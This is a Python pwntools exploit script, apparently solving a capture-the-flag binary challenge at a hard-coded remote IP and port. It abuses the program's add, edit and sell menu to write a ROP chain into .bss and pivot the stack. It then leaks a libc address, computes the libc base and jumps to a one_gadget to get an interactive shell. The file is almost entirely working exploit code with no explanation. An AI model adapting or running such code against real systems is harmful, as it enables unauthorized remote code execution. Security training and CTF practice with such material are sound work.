#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.242 --port 4204 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.242'
port = int(args.PORT or 4204)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *0x0000000000400ca6
b *0x0000000000400d7e
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(msg,prc):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(msg))
    io.sendlineafter(": ",str(prc))

def delet(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))

def edit(idx,msg,prc):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(msg))
    io.sendlineafter(": ",str(prc))

def sell(idx,msg):
    io.sendlineafter("> ","5")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter("?\n",str(msg))

libc = ELF("./libc-2.27.so")

pop_rdi = 0x0000000000400f63
pop_rsi = 0x0000000000400f61

libc_start_main = 0x601ff0
plt_puts = exe.plt['puts']
plt_scanf = 0x4006c0
bss = 0x602150 +0x900
bss_to = bss + 0x48
leave=0x0000000000400e11
address_s = 0x400fa6

add("a",123)
add("b",123)
add("c",123)
add("d",123)
add("e",123)

rop = [pop_rdi,
libc_start_main,
plt_puts,
pop_rdi,
address_s,
pop_rsi,
bss_to,
0,
plt_scanf]

for i in range(len(rop)):
    edit(0,'a'*(32+16+8)+p64(bss+i*8),123)
    edit(1,p64(rop[i]),123)

p = "a"*24
p += p64(2)
p += 'a'*16
p += p64(bss-8)
p += p64(leave)

sell(3,p)
io.recvline()
io.recvline()
data = u64(io.recvline()[:-1].ljust(8,"\x00"))
print (hex(data))
libc.address = data-libc.sym['__libc_start_main']
print hex(libc.address)

off = [0x4f3d5,0x4f432,0x10a41c]

one = libc.address + off[1]

io.sendline(p64(one))


io.interactive()

